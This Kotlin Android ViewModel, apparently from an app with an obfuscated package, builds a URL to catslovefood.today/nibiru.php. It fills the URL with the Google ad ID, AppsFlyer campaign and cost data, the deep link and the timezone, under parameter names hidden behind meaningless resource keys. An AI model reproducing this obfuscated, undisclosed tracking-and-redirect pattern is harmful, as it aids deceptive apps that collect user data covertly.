package com.asobimo.alchemi

import android.content.Context
import androidx.lifecycle.ViewModel
import androidx.lifecycle.viewModelScope
import com.appsflyer.AppsFlyerLib
import com.asobimo.alchemi.intentandstate.MoiSobotia
import com.asobimo.alchemi.intentandstate.MoiSostoyania
import com.asobimo.alchemi.internal.FileUtils
import com.asobimo.alchemi.remote.AppsDeepOne
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.channels.Channel
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import kotlinx.coroutines.flow.consumeAsFlow
import kotlinx.coroutines.launch
import okhttp3.HttpUrl
import java.util.*

class MyViewModel(fileUtils: FileUtils): ViewModel() {
    val fileManipulation = fileUtils
    val moiSobotia = Channel<MoiSobotia>(Channel.UNLIMITED)
    private val appsDeepOne = AppsDeepOne()
    private val _state = MutableStateFlow<MoiSostoyania>(MoiSostoyania.Moi_Load)
    val state: StateFlow<MoiSostoyania>
        get() = _state


    init { obrabotka_sobitii() }

    private fun obrabotka_sobitii(){
        viewModelScope.launch {
            moiSobotia.consumeAsFlow().collect{ sobitie->
                when(sobitie){
                    is MoiSobotia.GetU_R_L -> vernytIzFile()
                }
            }
        }
    }

    private fun vernytIzFile(){
        viewModelScope.launch {
            val url = fileManipulation.getFromFile()
            _state.value = MoiSostoyania.Moi_File(url)
        }
    }

     fun polozhitVFile(something:String){
        fileManipulation.insertToFile(something)
    }

     fun bild_leenk(kontekst: Context){
        appsDeepOne.vkcluchitOdinSignal(kontekst)
         viewModelScope.launch(Dispatchers.IO) {
             val google = appsDeepOne.vernytG00gle(kontekst)
             val deepLink = appsDeepOne.vernytDeepLink(kontekst)
             val value = "null"
             if (deepLink!=value){
                 appsDeepOne.otpravitOtchet(deepL = deepLink)
                 val deep = ctoto_delaet(kontekst,deepLink, null,google)
                 _state.value = MoiSostoyania.Moi_Deep(deep)
             }else{
                 val appF = appsDeepOne.vernytAppsFlyer(kontekst)
                 appsDeepOne.otpravitOtchet(appF = appF)
                 val app = ctoto_delaet(kontekst,"null",appF,google)
                 _state.value = MoiSostoyania.Moi_Apps(app)
             }
         }
    }
    private fun ctoto_delaet(kontekst: Context, deepLink: String, data: MutableMap<String, Any>?, gId: String ):String{
        val x = HttpUrl.Builder()
        x.apply {
            scheme("https")
            host("catslovefood.today")
            addPathSegment("nibiru.php")
            addQueryParameter(kontekst.resources.getString(R.string.adada), kontekst.resources.getString(
                R.string.kkms
            ))
            addQueryParameter(kontekst.resources.getString(R.string.anbda), TimeZone.getDefault().id)
            addQueryParameter(kontekst.resources.getString(R.string.ndsjsjb), gId)
            addQueryParameter(kontekst.resources.getString(R.string.ndjan), deepLink)
            addQueryParameter(kontekst.resources.getString(R.string.jndaj), if (deepLink != "null") "deeplink" else data?.get("media_source").toString())
            if (deepLink != "null") { addQueryParameter(kontekst.resources.getString(R.string.jadnaj), "null") }
            else { addQueryParameter(kontekst.resources.getString(R.string.af_id_key), AppsFlyerLib.getInstance().getAppsFlyerUID(kontekst)) }
            addQueryParameter(kontekst.resources.getString(R.string.jadnaj), data?.get("adset_id").toString())
            addQueryParameter(kontekst.resources.getString(R.string.ajndajdna), data?.get("campaign_id").toString())
            addQueryParameter(kontekst.resources.getString(R.string.akdnakdna), data?.get("campaign").toString())
            addQueryParameter(kontekst.resources.getString(R.string.akndakdna), data?.get("adset").toString())
            addQueryParameter(kontekst.resources.getString(R.string.ajdaj), data?.get("adgroup").toString())
            addQueryParameter(kontekst.resources.getString(R.string.audhaj), data?.get("orig_cost").toString())
            addQueryParameter(kontekst.resources.getString(R.string.danadmn), data?.get("af_siteid").toString())
        }.toString()
        return x.toString()
    }
}


